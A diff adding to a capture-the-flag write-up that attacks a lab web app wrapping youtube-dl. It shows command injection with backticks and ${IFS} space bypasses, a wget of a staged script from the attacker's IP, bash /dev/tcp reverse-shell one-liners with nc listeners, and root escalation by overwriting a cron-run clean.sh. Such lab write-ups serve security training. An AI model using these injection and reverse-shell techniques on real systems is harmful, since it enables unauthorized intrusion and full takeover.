@@ -71,8 +71,67 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /tmp                  (Status: 301) [Size: 312] [--> http://10.10.158.186/tmp/]
 ```
 
+### Apache version
+
+- Apache httpd 2.4.29 - CVE-2021-41773
+- https://github.com/iilegacyyii/PoC-CVE-2021-41773
+- Not going anywhere with this
+
+### The dl functionality
+
+- If we use a real youtube video ID it does not work. We get an error message  
+![image](https://user-images.githubusercontent.com/96747355/179367362-35353a69-8c96-4bae-a26c-e7b655113ac0.png)  
+- First I inspected on burp the request. Sent it to my repeater and played with it a little
+- I tried to inject a command after the url, and got interesting info  
+![image](https://user-images.githubusercontent.com/96747355/179367603-133a65f4-6f39-4b40-bec0-c4e2f9aa2d48.png)
+- Here are the interesting elements of the response
+```
+Unable to download webpage: HTTP Error 401: Unauthorized (caused by HTTPError()); please report this issue on https:\/\/yt-dl.org\/bug . Make sure you are using the latest version; type  youtube-dl -U  to update. Be sure to call youtube-dl with the --verbose flag and include its complete output
+"result_url":"\/tmp\/downloads\/62d2fd72c199c.mp3
+```
+- According to this it is using a binary called `youtube-dl` and put the converted video to a downloads folder in /tmp
+- We can check [youtube-dl documentation](https://github.com/ytdl-org/youtube-dl/blob/master/README.md#readme) for more info
+- We definitely can push further our cmd injection investigation. We can try using backquotes, and it works  
+![image](https://user-images.githubusercontent.com/96747355/179368334-757d68ed-afe0-4f76-9038-662702fcce18.png)
+- If I want to do more than just a command without args it is getting tricky because of the space, and url encoding does not work. But if you google linux command without space you find [this post on stackoverflow](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces), turns out you can replace a space with `${IFS}` which is a var that contains a space! It works if we do `ls${IFS}admin` but not if we do `ls${IFS}-al` it seems to interpret our `-`  
+![image](https://user-images.githubusercontent.com/96747355/179368991-1cad2673-557d-42fb-b2c7-52b66744a85d.png)  
+- We can still get our user flag this way though, as we saw it listed with the previous command that worked `cat${IFS}admin/flag.txt`
+- Let's try to get a reverse shell all the one liners with reverse have dash sign in them. let's see if we can wget a homemade file with a oneliner shell in it and execute it afterwards.
+- We make a file called `oneliner.sh` and put this in it  
+```
+bash -i >& /dev/tcp/ATTACKING-MACHINE-IP/4444 0>&1
+```
+- Replace the script with your IP
+- And we laucnh our python http server in the folder where our shell is
+- So now let's try to first wget our file `wget${IFS}http://10.13.22.56/oneliner.sh` we can already set up our listener so that we do not forget about it `rlwrap nc -lvp 4444` our wget seems to work  
+![image](https://user-images.githubusercontent.com/96747355/179369747-fc5aa394-5be0-403e-9def-fca82f1061b1.png)  
+![image](https://user-images.githubusercontent.com/96747355/179370010-f6101492-35a8-4478-9b30-a47dc76c6654.png)  
+- Let's try to execute it but before we need to make it executable `bash${IFS}oneliner.sh` our chmod with +x does not work let's try with 777 `chmod${IFS}777${IFS}oneliner.sh` and it works  
+![image](https://user-images.githubusercontent.com/96747355/179371010-6276b6b1-3906-4cb8-8e60-a59d0855c8a5.png)  
+- let's stabilize our shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+- If we look around a little we are able to answer question 2 with a cat on .htpasswd
+![image](https://user-images.githubusercontent.com/96747355/179373337-e007fd4e-12fe-46ea-af82-b462e5d01992.png)  
+- Let's try to overwrite clean.sh
+
+## Privesc
+
+- If we execute linpeas on the target we see that cron is running as root.
+- Let's get [pspy](https://github.com/DominicBreuker/pspy) in our target and execute it
+- It seems like there is a clean.sh file that is executed through a probable cron job  
+![image](https://user-images.githubusercontent.com/96747355/179373393-d1a39c41-3c0f-4abc-b642-1b0842fb04d8.png)
+```
+bash /var/www/html/tmp/clean.sh 
+/bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
+/usr/sbin/CRON -f
+```
+- The clean is just an `rm -rf downloads`
+- Let's launch a listener `rlwrap nc -lvp 5555`
+- `echo "bash -i >& /dev/tcp/10.13.22.56/5555 0>&1" > /var/www/html/tmp/clean.sh`
+- And we get a root shell and we can get our flag  
+![image](https://user-images.githubusercontent.com/96747355/179373526-68409f61-a3a5-4f1c-a1f9-61f8bc72cb1f.png)  
+
 ## Questions
 
 - What is the name of the secret folder? `admin` (we get this using gobuster, see above)
-- What is the user to access the secret folder?
+- What is the user to access the secret folder? to know this we need to do this one we have our reverse shell `cat admin/.htpasswd` we will get the user and password inside this file.
 - I let you find the flags on your own :)
